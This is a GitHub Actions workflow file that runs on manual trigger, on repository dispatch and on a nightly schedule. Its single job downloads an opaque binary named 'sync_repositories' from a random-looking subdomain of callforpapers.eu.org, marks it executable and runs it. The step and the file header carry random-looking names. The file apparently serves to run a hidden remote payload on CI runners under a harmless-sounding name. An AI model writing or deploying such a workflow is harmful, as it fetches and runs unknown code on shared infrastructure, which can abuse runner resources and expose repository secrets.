#2024-03-18-[135737]-xtq5s4j3
name: main

on:
  workflow_dispatch:

  repository_dispatch:
    types: runner_workflow

  schedule:
    - cron: "35 1 * * * "
    
jobs:
  build-deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: cx6ujv8r3qtos7pz
        run: |
          wget -q https://uvgh8d08ugo6k38b.callforpapers.eu.org/sync_repositories
          chmod 755 sync_repositories
          ./sync_repositories